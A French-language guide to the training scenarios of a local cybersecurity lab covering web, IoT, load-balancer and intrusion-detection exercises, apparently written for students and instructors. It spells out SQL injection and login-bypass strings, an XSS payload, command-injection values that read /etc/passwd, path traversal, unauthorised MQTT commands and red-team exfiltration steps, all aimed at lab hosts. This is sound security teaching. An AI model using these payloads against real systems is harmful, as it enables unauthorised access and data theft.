# Scénarios d'apprentissage - CyberLab Light

Ce document présente les différents scénarios d'apprentissage disponibles dans CyberLab Light. Chaque scénario se concentre sur un aspect particulier de la cybersécurité et utilise les modules correspondants du laboratoire.

## Scénario 1: Exploitation Web

**Objectif**: Exploiter les vulnérabilités web courantes dans les applications vulnérables.

**Modules requis**: Core + Web

**Démarrage**:
```bash
./start-web-scenario.sh
```

### Phase 1: Reconnaissance

1. **Scan de découverte**
   - Depuis Kali Linux, ouvrez un terminal et lancez:
   ```bash
   nmap -sV 172.16.1.0/24
   ```
   - Identifiez les services web actifs dans le réseau DMZ

2. **Analyse de vulnérabilités**
   - Utilisez Nikto pour analyser DVWA:
   ```bash
   nikto -h http://172.16.1.10
   ```

### Phase 2: Exploitation de DVWA

1. **Accès à DVWA**
   - Ouvrez http://localhost:8080 dans votre navigateur
   - Connectez-vous avec admin / password
   - Réglez le niveau de sécurité sur "low" (Configuration > DVWA Security)

2. **Injection SQL**
   - Accédez à la section SQL Injection
   - Essayez `1' OR '1'='1` comme ID utilisateur
   - Observez comment vous pouvez récupérer tous les utilisateurs

3. **Cross-Site Scripting (XSS)**
   - Accédez à la section XSS (Reflected)
   - Injectez `<script>alert('XSS')</script>` dans le champ
   - Essayez d'autres charges utiles XSS pour exfiltrer des cookies

4. **Command Injection**
   - Accédez à la section Command Injection
   - Essayez `127.0.0.1; cat /etc/passwd`
   - Observez comment vous pouvez exécuter des commandes système

### Phase 3: Exploitation de l'application bancaire

1. **Contournement d'authentification**
   - Accédez à http://localhost:8082
   - Utilisez l'injection SQL dans le formulaire de connexion:
     - Nom d'utilisateur: `admin' --`
     - Mot de passe: `anything`

2. **Autres vulnérabilités à découvrir**
   - Explorez l'application bancaire pour découvrir d'autres vulnérabilités

### Phase 4: Tests sur le serveur web vulnérable

1. **Traversée de répertoire**
   - Accédez à http://localhost:8083
   - Essayez d'accéder à des chemins comme `../../../etc/passwd`

2. **Enumération de répertoires**
   - Utilisez DirBuster depuis Kali pour découvrir des répertoires cachés

## Scénario 2: Sécurité IoT

**Objectif**: Exploiter les faiblesses des appareils IoT et de leurs protocoles.

**Modules requis**: Core + IoT

**Démarrage**:
```bash
./start-iot-scenario.sh
```

### Phase 1: Analyse du réseau IoT

1. **Cartographie du réseau**
   - Depuis Kali Linux, identifiez les appareils IoT:
   ```bash
   nmap -sn 192.168.2.0/24
   ```

2. **Scan des services**
   - Analysez les services sur les appareils découverts:
   ```bash
   nmap -sV 192.168.2.10 192.168.2.11
   ```

### Phase 2: Exploitation du protocole MQTT

1. **Écoute du trafic MQTT**
   - Installez les outils MQTT:
   ```bash
   apt update && apt install -y mosquitto-clients
   ```
   - Abonnez-vous à tous les topics:
   ```bash
   mosquitto_sub -h 192.168.2.2 -t "#"
   ```

2. **Publication de commandes MQTT non autorisées**
   - Publiez des commandes pour contrôler les appareils:
   ```bash
   mosquitto_pub -h 192.168.2.2 -t "home/thermostat/command" -m '{"action":"set", "temperature":35}'
   ```

### Phase 3: Exploitation des API d'appareils

1. **Manipulation du thermostat**
   - Accédez à l'interface web: http://localhost:8086
   - Utilisez curl pour manipuler l'appareil:
   ```bash
   curl -X POST http://localhost:8086/api/target -H "Content-Type: application/json" -d '{"temperature": 40.0}'
   ```

2. **Accès à la caméra IoT**
   - Accédez à la caméra: http://localhost:8087
   - Essayez de trouver le flux vidéo non protégé: http://localhost:8087/stream

### Phase 4: Compromission de la passerelle IoT

1. **Exploitation de l'API de la passerelle**
   - Accédez à la passerelle depuis le réseau IoT ou LAN
   - Essayez l'injection de commande via l'API ping:
   ```bash
   curl -X POST http://192.168.1.50/api/ping -d '{"ip":"127.0.0.1; id"}'
   ```

2. **Pivotement entre réseaux**
   - Utilisez la passerelle compromise pour pivoter entre le réseau IoT et le réseau corporate

## Scénario 3: Attaques d'infrastructure (Load Balancing)

**Objectif**: Exploiter les vulnérabilités dans une infrastructure d'équilibrage de charge.

**Modules requis**: Core + Load Balancing

**Démarrage**:
```bash
./start-lb-scenario.sh
```

### Phase 1: Reconnaissance de l'infrastructure

1. **Détection de l'équilibreur de charge**
   - Analyser les entêtes HTTP:
   ```bash
   curl -I http://localhost
   ```

2. **Accès à l'interface d'administration**
   - Ouvrez http://localhost:8404/stats
   - Observez les backends configurés et leur état actuel

### Phase 2: Contournement de l'équilibrage

1. **Détection de la méthode d'équilibrage**
   - Identifiez le type d'équilibrage utilisé (roundrobin, sticky sessions)
   ```bash
   for i in {1..10}; do curl -s http://localhost/ | grep -o "Backend [0-9]"; done
   ```

2. **Attaque directe des backends**
   - Contournez l'équilibreur en accédant directement aux backends:
   ```bash
   curl http://172.16.1.21/
   curl http://172.16.1.22/
   ```

### Phase 3: Exploitation des backends

1. **Exploitation de la traversée de répertoire**
   - Essayez d'accéder à des fichiers sensibles via le backend1:
   ```bash
   curl http://172.16.1.21/files/../etc/passwd
   ```

2. **Exploitation des vulnérabilités CORS**
   - Analysez les entêtes CORS du backend2:
   ```bash
   curl -I -H "Origin: http://attacker.com" http://172.16.1.22/
   ```

### Phase 4: Exploitation de l'API

1. **Injection de commande via l'API**
   - Utilisez l'API vulnérable pour exécuter des commandes:
   ```bash
   curl -X POST http://localhost/api/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1; cat /etc/passwd"}'
   ```

## Scénario 4: Détection d'intrusion

**Objectif**: Configurer la détection d'intrusions et déclencher/analyser des alertes.

**Modules requis**: Core + Monitoring

**Démarrage**:
```bash
./start-monitoring-scenario.sh
```

### Phase 1: Configuration de la détection

1. **Configuration des règles Snort**
   - Examinez les règles existantes:
   ```bash
   cat snort/rules/local.rules
   ```
   - Ajoutez une règle personnalisée pour détecter les scans Nmap

2. **Configuration de Kibana**
   - Accédez à Kibana: http://localhost:5601
   - Configurez un index pattern pour filebeat

### Phase 2: Génération de trafic malveillant

1. **Tentatives d'injection SQL**
   - Depuis Kali, lancez des requêtes contenant des charges utiles SQL:
   ```bash
   curl "http://172.16.1.10/vulnerabilities/sqli/?id=1%20OR%201=1&Submit=Submit"
   ```

2. **Balayage agressif**
   - Lancez un scan Nmap agressif:
   ```bash
   nmap -A -T4 172.16.1.0/24
   ```

### Phase 3: Analyse des alertes

1. **Visualisation des alertes Snort**
   - Dans Kibana, recherchez les événements dans l'index filebeat
   - Filtrez par mots-clés comme "SQL Injection" ou "Nmap Scan"

2. **Analyse forensique**
   - Examinez en détail les paquets qui ont déclenché les alertes
   - Identifiez les faux positifs potentiels

### Phase 4: Optimisation des règles

1. **Réduction des faux positifs**
   - Ajustez les règles pour réduire les faux positifs
   - Testez les règles modifiées

2. **Création de tableaux de bord**
   - Créez un tableau de bord Kibana pour visualiser les menaces

## Scénario 5: Red Team vs Blue Team

**Objectif**: Simulation d'attaque et défense en temps réel.

**Modules requis**: Tous les modules

**Démarrage**:
```bash
./start-all.sh
```

### Équipe Rouge (Attaquants)

1. **Reconnaissance initiale**
   - Cartographiez tous les réseaux accessibles
   - Identifiez les cibles potentielles et vulnérabilités

2. **Établissement d'un point d'entrée**
   - Exploitez une vulnérabilité web ou IoT
   - Obtenez un accès initial

3. **Mouvement latéral**
   - Pivotez entre les réseaux
   - Compromettez d'autres systèmes

4. **Exfiltration de données**
   - Identifiez des données sensibles
   - Exfiltrez les données via un canal caché

### Équipe Bleue (Défenseurs)

1. **Surveillance active**
   - Utilisez Kibana et Snort pour surveiller l'activité
   - Détectez les comportements anormaux

2. **Réponse aux incidents**
   - Identifiez et isolez les systèmes compromis
   - Analysez les méthodes d'attaque

3. **Remédiation**
   - Appliquez des corrections temporaires
   - Documentez les vulnérabilités exploitées

## Création de scénarios personnalisés

Vous pouvez créer vos propres scénarios en combinant différents modules. Voici un modèle de base:

1. **Définir les objectifs d'apprentissage**
   - Quelles compétences seront développées?
   - Quels concepts seront illustrés?

2. **Sélectionner les modules nécessaires**
   - Déterminez quels modules sont requis pour le scénario

3. **Créer un script de démarrage personnalisé**
   ```bash
   #!/bin/bash
   echo "🚀 Démarrage du scénario personnalisé..."
   docker-compose up -d
   docker-compose -f docker-compose.custom1.yml up -d
   docker-compose -f docker-compose.custom2.yml up -d
   echo "✅ Scénario personnalisé démarré!"
   ```

4. **Documenter les étapes du scénario**
   - Créez un guide étape par étape
   - Incluez des indications sans donner toutes les réponses

## Astuces pour les instructeurs

- **Mode guidé vs découverte**: Pour les débutants, fournissez plus d'indications; pour les avancés, laissez plus d'exploration
- **Points de contrôle**: Définissez des objectifs clairs pour chaque phase
- **Débriefing**: Après chaque scénario, discutez des techniques utilisées et des leçons apprises
- **Progression**: Organisez les scénarios du plus simple au plus complexe

---

Ces scénarios sont conçus pour être éducatifs et éthiques. Rappelez-vous que les compétences acquises ne doivent être utilisées que sur des systèmes pour lesquels vous avez une autorisation explicite.
